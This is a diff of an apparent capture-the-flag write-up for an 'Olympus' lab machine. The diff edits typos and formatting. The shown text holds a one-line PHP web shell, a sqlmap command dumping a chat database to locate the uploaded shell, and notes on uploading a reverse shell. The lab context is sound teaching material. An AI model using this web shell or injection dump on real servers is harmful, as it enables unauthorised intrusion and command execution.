@@ -75,7 +75,6 @@ phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10]
 server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 static                  [Status: 301, Size: 311, Words: 20, Lines: 10]
 ~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10]
-:: Progress: [4655/4655] :: Job [1/1] :: 33790 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 ```
 Bingo ! We have ~webmaster
 
@@ -140,15 +139,19 @@ So we have some chat logs but we can't find it anyware... I try to push my luck 
 
 ![image](https://user-images.githubusercontent.com/90036439/223983373-552684f7-5e73-4b54-ba76-ff0d0c38858a.png)
 
-I logged in with the credentials I cracked promotheuse:s[........]e
+I logged in with the credentials I cracked prometheus:s[........]e
 
 ![image](https://user-images.githubusercontent.com/90036439/223985036-95de1514-234a-4bfb-8717-edfccd387bd5.png)
 
-Let's put together what we know. The IT guy made sure that the files that are sent to the server via chat have a random name. We also know that all messages are stored in the database including the files we send. We can make a php file containing a reverse shell or one that executes commands on the server. Upload it to the server via the chat. Dump the database and get its name
+Let's put together what we know. The IT guy made sure that the files that are sent to the server via chat have a random name. We also know that all messages are stored in the database including the files that we send. We can make a php file containing a reverse shell or one that executes commands on the server. Upload it to the via the chat. Dump the database, get the name of our file and exploit it !
 
+First, make the file containing the php exploit and send it via the chat.
 ```bash
 root@ip-10-10-70-200:~# cat totalyNotEvileFile.php 
 <?php system($_GET["cmd"]); ?>
+```
+Secondly, dump the database using the argument --fresh-queries to get the new entry.
+```bash
 root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus -T chats --fresh-queries 
 ```
 ![image](https://user-images.githubusercontent.com/90036439/223987707-10423bfa-ffa9-4365-9aff-9e3763597f1d.png)
@@ -185,7 +188,6 @@ phpmyadmin              [Status: 403, Size: 281, Words: 20, Lines: 10]
 server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]
 static                  [Status: 301, Size: 321, Words: 20, Lines: 10]
 uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10]
-:: Progress: [4655/4655] :: Job [1/1] :: 11317 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 ```
 ![image](https://user-images.githubusercontent.com/90036439/223988276-0a0779ab-2cfd-4b1e-a09f-c56f732dd54c.png)
 
